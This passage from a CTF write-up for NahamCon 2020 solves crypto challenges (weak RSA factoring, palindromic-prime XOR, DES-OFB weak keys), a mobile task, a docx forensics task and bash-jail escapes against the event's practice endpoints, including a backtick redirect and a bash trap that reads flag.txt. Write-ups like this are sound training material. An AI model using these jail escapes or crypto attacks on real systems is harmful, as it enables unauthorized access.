Which matches what we'd expect to see, `2, 3, 5, 7, 11, 101, 131, 151, 181, …`.

Googling around for "Palindrome primes", I came across this list of [A002385 primes of digits less than 12](https://oeis.org/A002385/b002385.txt). This seemed like _way_ more than enough :)

I downloaded that file locally. We can update the given code to now just sequentially try our list of known palindrome primes, instead of having to generate them (i.e. no `a()`):

{% highlight python %}
with open('b002385.txt', 'r') as infile:
    palindrome_primes = infile.readlines()
    palindrome_primes = [int(x.strip().split()[1]) for x in palindrome_primes]

prime_idx = 0
primes = []
done = False
while(count < len(cipher)):
    #if (a(num)):
    for num in palindrome_primes[prime_idx:]:
        if count >=13 and count < 26:
            if num < 50000: continue
        elif count >= 26:
            if num < 500000: continue

        if (b(num)):
            print(chr(int(cipher[count]) ^ num), end='', flush=True)
            primes.append(num)
            if chr(int(cipher[count]) ^ num) == "}": done = True
            count += 1
            #if (count == 13):
            #    num = 50000
            #if (count == 26):
            #    num = 500000
        else:
            prime_idx += 1

        if done: break

print()
print(f"Primes used: {' '.join(map(str, primes))}")
{% endhighlight %}

So now we can pick back up immediately were we last left off in the list of palindromic primes too!

There is one other catch: there is that weird set of `if` statements at the bottom. Basically, they jump to requiring a larger palindromic prime once the character count reaches 13, and a even higher palindromic prime when the number of chars reaches 26. This would make the generation of generating the primes _incredibly_ slow as now there's the huge barrier of entry.

We can get around this by just filtering on our file of palindromic primes. If we have a count value inbetween one of those two ranges, skip any valid palindromic primes until we reach at least the threshold.

Cleaning up the above to be a bit nicer, we can run it and get the flag in less than a second!

```
time python decrypt.py
flag{pR1m3s_4re_co0ler_Wh3n_pal1nDr0miC}
Primes used: 2 3 5 7 11 101 131 151 181 191 313 353 373 70207 70507 70607 71317 71917 72227 72727 73037 73237 73637 74047 74747 75557 1003001 1008001 1022201 1028201 1035301 1043401 1055501 1062601 1065601 1074701 1082801 1085801 1092901 1093901
python decrypt.py  0.07s user 0.03s system 96% cpu 0.107 total
```

Flag is `flag{pR1m3s_4re_co0ler_Wh3n_pal1nDr0miC}`.

&nbsp;
&nbsp;


## Twinning
> These numbers wore the same shirt! LOL, #TWINNING!

Connecting to the endpoint, we get:

```
nc jh2i.com 50013
Generating public and private key...
Public Key in the format (e,n) is: (65537,31378393096163)
The Encrypted PIN is 26169559602561
What is the PIN?
```

FactorDB [easily factors the N](http://factordb.com/index.php?query=31378393096163) as:
* `5601641 * 5601643`

Use that for your `p` and `q` and then just do normal RSA to get the plaintext as `3093`.

{% highlight java %}
import java.math.BigInteger;

public class Main {
    public static void main(String[] args) {
        BigInteger p = new BigInteger("5601641");
        BigInteger q = new BigInteger("5601643");
        BigInteger e = new BigInteger("65537");
        BigInteger ct = new BigInteger("26169559602561");

        BigInteger phi = (p.subtract(new BigInteger("1"))).multiply(q.subtract(new BigInteger("1")));
        BigInteger modulus = p.multiply(q);
        BigInteger privateKey = e.modInverse(phi);

        System.out.println("modulus = "+modulus);
        System.out.println("phi = "+phi);
        System.out.println("d = "+privateKey);

        BigInteger pt = ct.modPow(privateKey, modulus);
        System.out.println("Pt: " + pt);

        /*
        String ptHex = pt.toString(16);
        // https://stackoverflow.com/a/4785776/13158274
        StringBuilder output = new StringBuilder();
        for (int i = 0; i < ptHex.length(); i+=2) {
            String str = ptHex.substring(i, i+2);
            output.append((char)Integer.parseInt(str, 16));
        }
        System.out.println(output);
        */
    }
}
{% endhighlight %}

```
nc jh2i.com 50013
Generating public and private key...
Public Key in the format (e,n) is: (65537,31378393096163)
The Encrypted PIN is 26169559602561
What is the PIN?
3093
Good job you won!
flag{thats_the_twinning_pin_to_win}
```

Flag is `flag{thats_the_twinning_pin_to_win}`

&nbsp;
&nbsp;

## Ooo-la-la
> Uwu, wow! Those numbers are fine!

More RSA. Given file (`cat prompt.txt`):

{% highlight python %}
N = 3349683240683303752040100187123245076775802838668125325785318315004398778586538866210198083573169673444543518654385038484177110828274648967185831623610409867689938609495858551308025785883804091
e = 65537
c = 87760575554266991015431110922576261532159376718765701749513766666239189012106797683148334771446801021047078003121816710825033894805743112580942399985961509685534309879621205633997976721084983
{% endhighlight %}

Again, FactorDB gives us the factors:

{% highlight python %}
from factordb.factordb import FactorDB

def check_factordb(N):
    factorized = FactorDB(N)
    factorized.connect()
    factor_list = factorized.get_factor_list()
    print(factor_list)
    return factor_list

>>> p, q = check_factordb(3349683240683303752040100187123245076775802838668125325785318315004398778586538866210198083573169673444543518654385038484177110828274648967185831623610409867689938609495858551308025785883804091)
[1830213987675567884451892843232991595746198390911664175679946063194531096037459873211879206428207, 1830213987675567884451892843232991595746198390911664175679946063194531096037459873211879206428213]
{% endhighlight %}

So normal RSA again.

Flag is `flag{ooo_la_la_those_are_sexy_primes}`.

&nbsp;
&nbsp;

## December
> This is my December...

We're given two files, the source code to generate the ciphertext and the cipher text. Source code looks like so:

{% highlight python %}
#!/usr/bin/env python

from Crypto.Cipher import DES

with open('flag.txt', 'rb') as handle:
	flag = handle.read()

padding_size = len(flag) + (8 - ( len(flag) % 8 ))
flag = flag.ljust(padding_size, b'\x00')

with open('key', 'rb') as handle:
	key = handle.read().strip()

iv = "13371337"
des = DES.new(key, DES.MODE_OFB, iv)
ct = des.encrypt(flag)

with open('ciphertext','wb') as handle:
	handle.write(ct)
{% endhighlight %}

So it looks like DES in Output FeedBack Mode. We know the IV too. Googling around for DES OFB known IV, I came across [this page](https://github.com/Alpackers/CTF-Writeups/tree/master/2016/BostonKeyParty/Crypto/des-ofb) for a previous CTF's similar challenge.

The code mentioned there works exactly as we need (slightly modified for our flag):

{% highlight python %}
from Crypto.Cipher import DES
import sys

with open('ciphertext', 'rb') as infile:
    ciphertext = infile.read()

IV = b'13371337'
KEY = b'\x00\x00\x00\x00\x00\x00\x00\x00'
a = DES.new(KEY, DES.MODE_OFB, IV)
plaintext = a.decrypt(ciphertext)
if b"flag{" in plaintext: print(plaintext)

KEY=b'\x1E\x1E\x1E\x1E\x0F\x0F\x0F\x0F'
a = DES.new(KEY, DES.MODE_OFB, IV)
plaintext = a.decrypt(ciphertext)
if b"flag{" in plaintext: print(plaintext)

KEY=b"\xE1\xE1\xE1\xE1\xF0\xF0\xF0\xF0"
a = DES.new(KEY, DES.MODE_OFB, IV)
plaintext = a.decrypt(ciphertext)
if b"flag{" in plaintext: print(plaintext)

KEY=b"\xFF\xFF\xFF\xFF\xFF\xFF\xFF\xFF"
a = DES.new(KEY, DES.MODE_OFB, IV)
plaintext = a.decrypt(ciphertext)
if b"flag{" in plaintext: print(plaintext)
{% endhighlight %}

Runs as:

```
python decrypt.py
b'These are my snow covered dreams\nThis is me pretending\nflag{this_is_all_i_need}\x00'
```

Flag is `flag{this_is_all_i_need}`

&nbsp;
&nbsp;

## Raspberry
> Raspberries are so tasty. I have to have more than just one!

&nbsp;
![]({{ site.baseurl }}/img/nahamConCTF2020/isthiscrypto.png)
&nbsp;

_OK, so maybe I'm just still salty from all the RSA at Really Awesome CTF..._

Anyways, given file:

```
n = 7735208939848985079680614633581782274371148157293352904905313315409418467322726702848189532721490121708517697848255948254656192793679424796954743649810878292688507385952920229483776389922650388739975072587660866986603080986980359219525111589659191172937047869008331982383695605801970189336227832715706317
e = 65537
c = 5300731709583714451062905238531972160518525080858095184581839366680022995297863013911612079520115435945472004626222058696229239285358638047675780769773922795279074074633888720787195549544835291528116093909456225670152733191556650639553906195856979794273349598903501654956482056938935258794217285615471681
```

Again, FactorDB comes in clutch. This time, we have _lots_ o' factors:

{% highlight python %}
>>> from factordb.factordb import FactorDB
>>>
>>> def check_factordb(N):
...     factorized = FactorDB(N)
...     factorized.connect()
...     factor_list = factorized.get_factor_list()
...     print(factor_list)
...     return factor_list
...
>>> a = check_factordb(7735208939848985079680614633581782274371148157293352904905313315409418467322726702848189532721490121708517697848255948254656192793679424796954743649810878292688507385952920229483776389922650388739975072587660866986603080986980359219525111589659191172937047869008331982383695605801970189336227832715706317)
[2208664111, 2214452749, 2259012491, 2265830453, 2372942981, 2393757139, 2465499073, 2508863309, 2543358889, 2589229021, 2642723827, 2758626487, 2850808189, 2947867051, 2982067987, 3130932919, 3290718047, 3510442297, 3600488797, 3644712913, 3650456981, 3726115171, 3750978137, 3789130951, 3810149963, 3979951739, 4033877203, 4128271747, 4162800959, 4205130337, 4221911101, 4268160257]
>>> len(a)
32
{% endhighlight %}

32 factors! But still, _it's just RSA_. So instead of using `p` and `q` and then finding phi with `p-1`*`q-1` and then using that to find d, etc... We need to use `prime0-1`*`prime1-1`*`prime2-1`*...*`primeN-1` to calculate phi.

I used that same code from python to print out the Java code for me, because I'm lazy:

{% highlight python %}
>>> a = [2208664111, 2214452749, 2259012491, 2265830453, 2372942981, 2393757139, 2465499073, 2508863309, 2543358889, 2589229021, 2642723827, 2758626487, 2850808189, 2947867051, 2982067987, 3130932919, 3290718047, 3510442297, 3600488797, 3644712913, 3650456981, 3726115171, 3750978137, 3789130951, 3810149963, 3979951739, 4033877203, 4128271747, 4162800959, 4205130337, 4221911101, 4268160257]
>>> i = 0
>>> for x in a:
...   print(f"BigInteger prime{i} = new BigInteger(\"{x}\");", end=' ')
...   print(f"list.add(prime{i});")
...   i+=1
...
BigInteger prime0 = new BigInteger("2208664111"); list.add(prime0);
BigInteger prime1 = new BigInteger("2214452749"); list.add(prime1);
BigInteger prime2 = new BigInteger("2259012491"); list.add(prime2);
BigInteger prime3 = new BigInteger("2265830453"); list.add(prime3);
BigInteger prime4 = new BigInteger("2372942981"); list.add(prime4);
BigInteger prime5 = new BigInteger("2393757139"); list.add(prime5);
BigInteger prime6 = new BigInteger("2465499073"); list.add(prime6);
BigInteger prime7 = new BigInteger("2508863309"); list.add(prime7);
BigInteger prime8 = new BigInteger("2543358889"); list.add(prime8);
BigInteger prime9 = new BigInteger("2589229021"); list.add(prime9);
BigInteger prime10 = new BigInteger("2642723827"); list.add(prime10);
BigInteger prime11 = new BigInteger("2758626487"); list.add(prime11);
BigInteger prime12 = new BigInteger("2850808189"); list.add(prime12);
BigInteger prime13 = new BigInteger("2947867051"); list.add(prime13);
BigInteger prime14 = new BigInteger("2982067987"); list.add(prime14);
BigInteger prime15 = new BigInteger("3130932919"); list.add(prime15);
BigInteger prime16 = new BigInteger("3290718047"); list.add(prime16);
BigInteger prime17 = new BigInteger("3510442297"); list.add(prime17);
BigInteger prime18 = new BigInteger("3600488797"); list.add(prime18);
BigInteger prime19 = new BigInteger("3644712913"); list.add(prime19);
BigInteger prime20 = new BigInteger("3650456981"); list.add(prime20);
BigInteger prime21 = new BigInteger("3726115171"); list.add(prime21);
BigInteger prime22 = new BigInteger("3750978137"); list.add(prime22);
BigInteger prime23 = new BigInteger("3789130951"); list.add(prime23);
BigInteger prime24 = new BigInteger("3810149963"); list.add(prime24);
BigInteger prime25 = new BigInteger("3979951739"); list.add(prime25);
BigInteger prime26 = new BigInteger("4033877203"); list.add(prime26);
BigInteger prime27 = new BigInteger("4128271747"); list.add(prime27);
BigInteger prime28 = new BigInteger("4162800959"); list.add(prime28);
BigInteger prime29 = new BigInteger("4205130337"); list.add(prime29);
BigInteger prime30 = new BigInteger("4221911101"); list.add(prime30);
BigInteger prime31 = new BigInteger("4268160257"); list.add(prime31);
{% endhighlight %}

So now we replace p and q in our previous Java RSA code with all these primes, and then iterate through each of them minus 1 to get phi:

{% highlight java %}
        BigInteger phi = new BigInteger("1");
        for (int i=0; i<list.size(); i++){
            phi = phi.multiply((list.get(i).subtract(BigInteger.ONE)));
        }
{% endhighlight %}

The rest of the Java RSA code is the same as the above for [twinning](#twinning).

Compiling with `javac` and then running, we get the flag.

Flag is `flag{there_are_a_few_extra_berries_in_this_one}`.

&nbsp;
&nbsp;

# Mobile
## Candroid
> I think I can, I think I can!

`strings` on the downloaded apk.

Flag is `flag{4ndr0id_1s_3asy}`.

&nbsp;
&nbsp;

# Misc
## Vortex
> Will you find the flag, or get lost in the vortex?

Connecting to the endpoint, it just streams a bunch of junk forever. Somewhere in there is probably the flag string.

I just connected to the endpoint and piped to a file and let it run for about 20 seconds.

{% highlight bash %}
nc jh2i.com 50017 > vortex
^C
grep flag vortex
Binary file vortex matches
{% endhighlight %}

Seems like that was enough! Opening the file and searching for `flag{` we find it.

Flag is `flag{more_text_in_the_vortex}`.

&nbsp;
&nbsp;

## Fake File
> Wait... where is the flag?

Connecting to the endpoint, we see we get what looks like a shell:

{% highlight bash %}
nc jh2i.com 50026
bash: cannot set terminal process group (1): Inappropriate ioctl for device
bash: no job control in this shell
user@host:/home/user$
{% endhighlight %}

If we inspect the user's directory, we see two entries for `..` (usually the next directory up):

{% highlight bash %}
nc jh2i.com 50026
bash: cannot set terminal process group (1): Inappropriate ioctl for device
bash: no job control in this shell
user@host:/home/user$ ls
ls
user@host:/home/user$ ls -a
ls -a
.
..
..
user@host:/home/user$ cat .*
cat .*
cat: .: Is a directory
cat: ..: Is a directory
flag{we_should_have_been_worried_about_u2k_not_y2k}
{% endhighlight %}

Flag is `flag{we_should_have_been_worried_about_u2k_not_y2k}`.

&nbsp;
&nbsp;

## Alkatraz
> We are so restricted here in Alkatraz. Can you help us break out?

Connecting to the endpoint, looks like we're in a bash jail. [This page](http://blog.dornea.nu/2016/06/20/ringzer0-ctf-jail-escaping-bash/) has some good resources for techniques in bash jail.

{% highlight bash %}
`<flag.txt`
/bin/rbash: line 24: flag{congrats_you_just_escaped_alkatraz}: command not found
{% endhighlight %}

Flag is `flag{congrats_you_just_escaped_alkatraz}`.

&nbsp;
&nbsp;

## Trapped
> Help! I'm trapped!

Another bash jail:

{% highlight bash %}
nc jh2i.com 50019
bash: cannot set terminal process group (-1): Inappropriate ioctl for device
bash: no job control in this shell
user@host:/home/user$ ls
ls
You're stuck in the trap!
user@host:/home/user$ cat
cat
You're stuck in the trap!
user@host:/home/user$ ls ../../
ls ../../
You're stuck in the trap!
user@host:/home/user$ ls -alrt
ls -alrt
You're stuck in the trap!
{% endhighlight %}

Huh... OK. There is also some logic that seems to "trap" you if your command has anything to do with "You're stuck in the trap!":

{% highlight bash %}
user@host:/home/user$ You're stuck in the trap!
You're stuck in the trap!
> ls
ls
> cat
cat
> who
who
> echo shit
echo shit
...
{% endhighlight %}

After trying a bunch of the "standard" things to try to escape out of a bash jail, I started thinking more about that `You're stuck in a trap!` process. Whenever we type (at least) `You're` in the "normal" shell, it dumps up in what seems like an even more restricted shell. However, if you give it some bad inputs, it will quit out and return you back to the "normal" shell. E.g, just pressing down, left, up, right (x2) arrow keys:

{% highlight bash %}
user@host:/home/user$ You're
You're
> ^[[B^[[D^[[A^[[C^[[B^[[D^[[A^[[C
> You're
You're stuck in the trap!
user@host:/home/user$
{% endhighlight %}

The fact that we're getting kicked out of whatever this thing is made me think about trying to take advantage of bash's `trap`. Read: [here](https://www.linuxjournal.com/content/bash-trap-command) (or just use Google, people).

I first tried `ls`/`ls -alrt` but that didn't get me anything.

On a whim, I assumed the flag would be at the same place as the last jail challenge: `/home/user/flag.txt`. So I tried to `cat` that:

{% highlight bash %}
user@host:/home/user$ You're
You're
> trap "cat /home/user/flag.txt" SIGHUP SIGINT SIGQUIT SIGPIPE SIGTERM DEBUG EXIT
Trap "cat /home/user/flag.txt" SIGHUP SIGINT SIGQUIT SIGPIPE SIGTERM DEBUG EXIT
> ^[[B^[[D^[[A^[[C^[[B^[[D^[[A^[[C
> You're
trap "cat /home/user/flag.txt" SIGHUP SIGINT SIGQUIT SIGPIPE SIGTERM DEBUG EXIT
You're stuck in the trap!
user@host:/home/user$ You're
You're
> ^[[B^[[D^[[A^[[C^[[B^[[D^[[A^[[C^[[B^[[D^[[A^[[C^[[B^[[D^[[A^[[C^[[B^[[D^[[A^[[C^[[B^[[D^[[A^[[C
> You're
flag{you_activated_my_trap_card}
bash: $'Youre\nYoure': command not found
user@host:/home/user$
{% endhighlight %}

It worked!

{% highlight bash %}
trap "cat /home/user/flag.txt" SIGHUP SIGINT SIGQUIT SIGPIPE SIGTERM DEBUG EXIT
{% endhighlight %}

Flag is `flag{you_activated_my_trap_card}`.

&nbsp;
&nbsp;

# Forensics
## Microsooft
> We have to use Microsoft Word at the office!? Oof...

We're given a `.docx`. Opening and recovering in Word after warning about unprintable things, it just prints "oof".

Inspecting the files in the `.docx` file, there is a `src/oof.txt`. In there, we see the flag.

Flag is `flag{oof_is_right_why_gfxdata_though}`.

&nbsp;
&nbsp;
